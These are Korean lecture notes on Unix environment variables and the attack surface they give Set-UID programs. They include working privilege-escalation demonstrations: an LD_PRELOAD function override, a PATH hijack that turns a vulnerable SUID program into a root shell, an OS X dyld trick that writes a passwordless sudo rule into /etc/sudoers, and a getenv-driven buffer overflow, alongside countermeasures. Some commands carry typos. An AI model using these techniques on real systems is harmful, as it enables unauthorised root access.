
- 환경변수
	- 동적으로 명명된 값의 집합
	- 어떤 프로세스가 실행되는 운영 환경의 일부
	- 실행 중인 프로세스의 동작에 영향을 줌
	- PATH 변수가 있으며, 프로그램 실행 전체 경로가 제공되지 않으면 쉘 프로세스가 프로그램의 위치를 찾기 위해 PATH 사용
	- 프로세스는 fork() 시스템 호출을 사용해 새 프로세스가 생성될 때 부모의 환경 변수를 상속하거나, execve() 시스템 호출을 사용해 메모리 공간을 새 프로그램 데이터로 덮어 씌우며 환경변수를 초기화함
	- execve() 호출시 환경변수 전달 가능
	- 환경변수는 초기에 스택에 저장되며, main() 호출전에 스택에 푸시됨
	- envp와 environ은 초기에 동일 위치를 가리키지만, envp는 main() 함수 내에서만 접근 가능하며 environ은 전역변수임
	- 환경변수에 대한 메모리 위치 변경 시 environ 변경 가능
	- 쉘 변수는 쉘에서 사용되는 내부 변수, 사용자가 할당 및 삭제 가능
- 환경 변수 접근 방법
	- main() 파라미터 통해 접근 (char* envp[])
	- 전역변수 사용해 접근 (extern char** environ)
- 프로세스가 환경 변수를 얻는 방법
	- fork() 시스템 호출을 사용해 자식은 부모의 환경 변수를 상속받음
	- 프로세스가 자체적으로 새 프로그램을 실행 할 때, execve()를 이용해 시스템 호출. 이때 프로세스 메모리 공간이 새 프로그램 데이터로 덮어 씌워지며 이전 환경변수 손실. 
	  execve()는 int execve(const char* filename, char* const argv[], <<char* const envp[]>>)를 이용해 환경 변수 전달 가능
- 환경 변수의 메모리 할당
	- 환경 변수는 초기에 메모리의 stack에 저장
	- heap은 malloc, new등으로 동적 메모리 관리
	- main() 호출 전에, 환경 변수들은 스택에 푸시됨
	- 환경 변수들은 스택에 저장된 포인터 배열을 이용해 실제 환경변수 문자열 가리킴
	- main() 함수의 스택 프레임에 위치한 환경 변수들은 main() 함수 내에서 사용됨
	- envp와 environ은 초기에 동일한 위치를 가리킴
	- envp는 main() 함수 내에서만 접근 가능한 지역변수 이며, environ은 전역변수
	- 환경 변수가 변경 되어 환경변수 저장 위치가 heap으로 이동할 때, environ은 가변, envp는 불변
	  → 최신의 환경변수에 접근 위해선 envp보단 environ 포인터 사용이 바람직
- 쉘 변수와 환경 변수
	- 쉘 변수
		- 쉘 내부에서 사용되는 내부 변수
		- 사용자가 생성, 할당 및 삭제 가능
	- 환경 변수
		- 프로세스의 실행 환경에 영향을 주는 동적으로 명명된 값의 집합
		- 프로세스의 동작 방식을 조절
		- 프로그램 실행 시 중요한 역할
- /proc file system
	- /proc 파일 시스템은 커널 및 프로세스 정보 실행중인 프로세스에 대한 데$이터가 저장) 제공
	- strings /proc/ $ /environ 명령어를 통해 현재 프로세스의 환경 변수 출력 가능
- 쉘 변수와 환경 변수 - 이어서
	- 쉘 변수와 환경 변수는 다르다
	- 쉘 프로그램 실행 시 ,쉘 변수로 환경 변수가 복사된다. 쉘 변수 변경은 환경 변수에 영향을 주지 않는다.
```shell 
$ strings /proc/&&/environ | grep LOGNAME
LOGNAME = seed -> 환경변수
$ ehco $LOGNAME
seed -> 쉘변수
$ LOGNAME = bob -> 환경변수 LOGNAME 변경
$ echo $LOGNAME
bob
$ strings /proc/$$/environ | grep LOGNAME
LOGNAME = seed -> 환경변수는 영향없음
$ unset LOGNAME -> 쉘변수 초기화
$ echo $LOGNAME

$ strings /proc/$$/environ | grep LOGNAME
LOGNAME = seed -> 환경변수는 영향없음
```
- 쉘 변수가 자식 프로세스의 환경 변수에 미치는 영향
	- 부모 프로세스의 쉘 변수 중 부모의 환경변수 사본 쉘 변수와, exported shell 변수가 자식으로 전달된다.
	- not exported shell 변수와 predefined shell 변수는 자식에게 전달되지 않는다.
```shell
$ strings /proc/$$/environ | grep LOGNAME
LOGNAME = seed
$ LOGNAME2 = alice
$ export LOGNAME3 = bob 
-> exported shell variable
$ env | grep LOGNAME 
-> 현재 환경변수 보여주는 명령어: 쉘은 새로운 자식 프로세스를 생성해 환경 변수 출력
LOGNAME = seed
LOGNAME3 = bob
$ unset LOGNAME 
-> LOGNAME 쉘 변수 할당 해제
$ env | grep LOGNAME
LOGNAME3 = bob
```
- 환경 변수로 인한 공격 표면
	- 환경 변수의 숨겨진 사용은 위험
	- 사용자가 환경 변수를 설정할 수 있으므로 ,환경변수는 SUID 프로그램에서의 공격표면이 된다
	- 외부 라이브러리 함수 코드를 로딩하는 Linker, Library, External Program, Application Code등이 공격 표면이 될 수 있음
- Linker를 이용한 공격
	- 외부 라이브러리를 로드하는 과정에서 공격 발생가능
	- Dynamic Linking
		- 프로그램 실행 시 linking
		- gcc -o hello hello.c
		- 환경 변수를 사용하며, 그것이 공격표면화
		- 메모리 낭비 없음
		- 하지만 프로그램의 일부는 컴파일 시 정해지지 않은 상태이다
		- 동적 라이브러리가 실행 중에 로드되기에 악의적 코드 삽입 가능성
	- Static Linking
		- 컴파일시 linking
		- gcc -static -o hello hello.c
		- 컴파일 시 라이브러리를 프로그램에 직접 포함
		- 다이나믹 프로그램에 비해 100배 크다
		- 메모리 낭비가 심하다
		- 라이브러리 코드 업데이트 시 모든 프로그램은 패치가 필요하다
- Dynamic Linker 공격 - Case 1
	- 링커는 LD_PRELOAD 환경변수에서 라이브러리 우선 검색
	- 못 찾으면 LD_LIBRARY_PATH에서 검색
	- 두 변수는 사용자가 설정 가능하므로 프로그램이 SUID 프로그램이라면 보안 위반으로 이어짐
	- Normal Programs
		- 동적 링킹된 sleep 함수를 프로그램이 호출할 때, 공격자는 자체 sleep()함수를 구현하고, 해당 공유 라이브러리를 LD_PRELOAD 환경변수에 추가함으로써 악의적인 코드 삽입 가능
```c
mytest.c

int main() {
	sleep(1);
	return 0;
}

sleep.c
void sleep (int s){
	printf("I am not sleeping");
}
```

```shell
attacking

$ gcc -c sleep.c
$ gcc -shared -o libmylib.so.1.0.1 sleep.o
-> sleep.c 컴파일 한 뒤 공유 라이브러리에 배포

$ export LD_PRELOAD = ./libmylib.so.1.0.1
-> 환경변수에 공유 라이브러리 추가 :: 이제 sleep(1) 실행 시 system의 sleep 대신 mySleep이 실행된다!

$ ./mytest
I am not sleeping!
-> ./mytest는 먼저 LD_PRELOAD에서 sleep을 찾는다. gotcha! our library function got invoked!

$ unset LD_PRELOAD
$ ./mytest
$
-> 다시 system의 sleep 실행
```
- 
	- SUID Programs
		- 위의 기법이 SUID 프로그램에서 작동 시 매우 위험
		- **그러나 SUID 프로그램은 LD_PRELOAD 및 LD_LIBRARY_PATH 환경 변수를 무시하는 동적 링커의 대책이 적용**되어있어, sleep()함수가 호출되지 않을 수 있음
```shell
$ cp /usr/bin/env ./myenv
$ sudo chown root myenv
$ sudo chmod 4755 myenv

$ export LD_PRELOAD = ./libmylib.so.1.0.1
$ export LD_LIBRARY_PATH = . 
-> 현재 디렉토리
$ export LD_MYOWN = "my own value"

$ env | grep LD_
LD_PRELOAD = ./libmylib.so.1.0.1
LD_LIBRARY_PATH = . 
LD_MYOWN = my own value
$ myenv | grep LD_
LD_MYOWN = my own value
-> SUID 프로그램에서는 LD_PRELOAD 및 LD_LIBRARY_PATH의 대책이 적용되어 있음!
```
- Dynamic Linker 공격 - Case 2
	- OS X의 동적링커 사례
	- DYLD_PRINT_TO_FILE 환경변수는 사용자가 dyld에 파일 이름을 제공할 수 있게 하며, SUID 프로그램에서는 사용자가 보호된 파일에 쓰기 권한을 가지게 함. 이로 인해 **파일 디스크립터가 닫히지 않는 Capability Leaking 발생** 가능
	- 과정
	1. DYLD_PRINT_TO_FILE를 /etc/sudoers로 설정
	2. Bob의 계정으로 전환하기 위해 su를 실행
	3. su를 실행하는 동안 dyld가 실행됨
	4. **su가 Set-UID root 프로그램이므로 dyld도 root 권한으로 실행**되어 /etc/sudoers를 성공적으로 쓰기 모드로 엽니다
	5. echo 명령어를 사용하여 /etc/sudoers에 쓰기
	6. 여기서 "3"은 /etc/sudoers의 쓰기용 파일 디스크립터를 나타냅니다
	7. 결과적으로 bob은 sudo를 사용하여 root로서 어떤 명령어든 실행할 수 있습니다.
```shell
$ DYLD_PRINT_TO_FILE = /etc/sudoers
$ su bob
password:
$ echo "bob ALL = (ALL) NOPASSWD:ALL" >& 3
-> bob은 모든 프로그램에 대해 root 권한을 가져 패스워드가 필요없다는 명령어
```
- 외부 프로그램을 통한 공격
	- 어플리케이션이 외부 프로그램을 호출 시, 환경 변수 사용 가능성 존재
	- system() 
		- prog_a에서 system(prog_b) 호출
		- fork() 시스템 콜을 통해 자식 프로세스로써 쉘 프로세스를 실행 (PATH 환경변수 참조 - 쉘프로세스를 거쳐서 prog_b를 실행하기 때문에)
		- 쉘 프로세스로 prog_b 실행
	- execve()
		- prog_a에서 execve(prog_b) 호출
		- 직접적으로 prog_b 실행
	- 공격표면 - prog_a가 pro_b를 호출할 때
		- execve()사용 : prog_a와 prog_b의 합집합
		- system()사용 : prog_a, prog_B, 쉘 프로그램(bash 등)의 합집합
		- 결과적으로, execve()는 쉘을 호출하지 않으며, 환경변수의 영향을 받지 않으므로 특권 프로그램에서 외부 프로그램을 호출할 때는 execve()를 사용해야 쉘을 거치지 않고 직접 실행되므로 안전하다
		- 환경변수는 일반 사용자가 SUID 입력등으로 조작할수 있음
	- 예시 (PATH 변수 조작)
```c
vulnerable.c

int main(){
	system("cal");
}

cal.c -> 공격자에 의해 작성된 코드

int main(){
	system("/bin/dash/");
}
```

```shell
$ gcc -o vul vulnerable.c
$ sudo chown root vul
$ sudo chmod 4755 vul
$ vul
달력 출력 (usr/bin/cal 실행)

$ gcc -o cal cal.c
$ export PATH = .:$PATH
-> 현재 디렉토리 PATH 환경변수에 추가
$ echo $PATH
.:/usr/local .... -> 현재 디렉토리가 가장 높은 우선순위의 환경변수가 됨
$ vul
#
#
cal을 찾아야하는데 현재 디렉토리가 가장 높은 우선순위의 환경변수이므로 cal.c가 실행이 된다-> root 쉘(/bin/dash) 실행 -> 공격 성공
$ prid
ruid = seed euid = root
```
	- /bin/dash에 의한 자동 권한 하향을 비활성화하기 위해 다음 작업 수행해야 함
```shell
$ sudo ln -sf /bin/zsh /bin/sh
-> zsh로 기본 쉘 변경 : zsh는 카운터메저가 적용 안되어있음
$ sudo ln -sf /bin/dash /bin/sh
-> 원래로 돌아가려면 이것을
```
- 라이브러리를 통한 공격
	- 프로그램은 외부 라이브러리의 함수를 사용하기도 함
	- 이런 함수가 환경변수를 사용하면, 공격표면 추가
- 라이브러리를 통한 공격 - Case Locale in UNIX
	- 메시지 출력마다, 프로그램은 번역된 메시지 위해 라이브러리 함수 사용
	- UNIX는 libc 라이브러리의 gettext()와 catopen() 사용
	- 예시 - argc 검사해 argument가 주어지지 않았을 때 사용법을 출력하고 프로그램 종료
```c
int main(int argc, char** argv){

	if(argc > 1){
		printf(gettext("usage: %s filename"), argv[0]);
		exit(0);
	}
	printf("normal execution proceeds...");
}
```
- 
	- gettext()에서 리턴된 값이 priintf()의 포맷 문자열로 사용됨
	- 공격자가 SUID 프로그램 등으로 printf() 호출에 제공되는 포맷 문자열을 제어할 수 있다면(NLSPATH 등의 환경변수 조작), 특권 프로그램의 포맷 문자열을 제어할 수 있게 되어 결국 특권 프로그램의 완전 제어 가능
- 대책
	- SUID 프로그램에서 catopen()및 catgets()함수가 호출 될 때 NSLPATH 환경 변수를 명시적으로 확인하고 무시하는 방법 등
	- 보안 상 문제가 없는지 확인하는 과정을 sanitization이라 한다
- 응용 프로그램 코드를 통한 공격
	- 프로그램은 직접 환경 변수 사용 가능. 특권 프로그램의 경우, 이는 신뢰할 수 없는 입력 가져올 수 있음
	- 예시 - 환경 변수를 사용해 현재 작업 디렉토리 출력
```c
print_pwd.c

int main(void)
{
	char arr[64];
	char* ptr;

	ptr = getenv("PWD");
	->PWD 환경변수를 가져온다
	if(ptr != NULL) {
		sptintf(arr,"present working dir is: %s", ptr);
		->arr 버퍼에 문자열 채운다
		printf("%s\n",arr);
	}
	return 0;
}
```

```shell
$ pwd
/seed/temp
$ echo $PWD
/seed/temp
$ cd..
$ echo $PWD
/seed
$ cd /
$ echo $PWD
/
-- current dir with unmodified shell var --
$ PWD = xyz
$ pwd
/
$ echo $PWD
xyz
$ ./print_pwd
present working dir is: xyz
$ export PWD = "anything I want"
$ ./print_pwd
present working dir is: anything I want
-- current dir with modified shell var --
```
- 프로그램은 PWD 환경 변수를 사용해 현재 디렉토리를 가져오고 이를 arr 배열에 복사하는데, 입력 길이 확인이 없어 **버퍼 오버플로우 발생 가능**
- PWD 값은 쉘 프로그램에서 가져오며, 폴더 변경마다 쉘 프로그램이 쉘 변수 업데이트. 또한 사용자가 직접 쉘 변수 변경 가능
- 이런 상황에서, 프로그램은 PWD 값에 의존하여 현재 디렉토리를 가져오는데, 이는 사용자가 PWD 값을 조작해 공격할 수 있음을 의미
- 대책
	- secure_getenv() 사용 - 안전한 실행 필요(SUID 프로그램에서) 시 NULL 반환
- 일반 사용자가 root 권한 얻는 두가지 방식: Set-UID Approach vs Service Approach
	- SUID 접근 방식
		- 일반 사용자가 일시적으로 루트 권한 획득 위해 특별한 프로그램을 실행해야 하는 방식
		- 환경변수로 인해 더 넓은 공격 표면을 가지며 환경 변수를 신뢰할 수 없음
	- 서비스 접근 방식
		- 일반 사용자가 특권 작업 수행 위해 특권 서비스 요청
		- 환경 변수 신뢰 가능
		- 안전
- 요약
1. 환경 변수(Environment Variables): 환경 변수는 프로세스가 실행되는 운영 환경의 일부로서 동적으로 명명된 값들의 집합을 의미합니다. 예를 들어, PATH 변수는 프로그램 실행 시 쉘 프로세스가 프로그램의 위치를 찾는 데 사용됩니다.
  
2. 환경 변수의 전달: 새로운 프로세스가 fork() 시스템 호출을 통해 생성되면 자식 프로세스는 부모 프로세스의 환경 변수를 상속받습니다. 또한, execve() 시스템 호출을 통해 새로운 프로그램을 실행할 때, 현재 프로세스의 메모리 공간이 새 프로그램에서 제공된 데이터로 덮어씌워지며 이전 환경 변수는 손실됩니다.

3. 환경 변수의 프로그램 동작에 미치는 영향: 환경 변수는 실행 중인 프로세스의 동작에 영향을 줄 수 있습니다. 예를 들어, 환경 변수를 통해 프로그램의 동작 방식이 변경될 수 있습니다.

4. 환경 변수에 의해 소개된 위험: 환경 변수는 공격 표면을 넓힐 수 있는 요소로 작용할 수 있습니다. 특히 Set-UID 접근 방식에서 환경 변수의 신뢰성이 문제가 될 수 있습니다.

5. 사례 연구(Case Studies): 환경 변수를 통한 공격 사례에 대한 실제 사례 연구가 포함될 수 있습니다.

6. Set-UID와 서비스 접근 방식의 공격 표면 비교: Set-UID와 서비스 접근 방식 간의 공격 표면을 비교하고, 환경 변수를 통해 발생할 수 있는 위험 요소를 분석하여 두 접근 방식의 상대적인 안전성을 평가할 수 있습니다.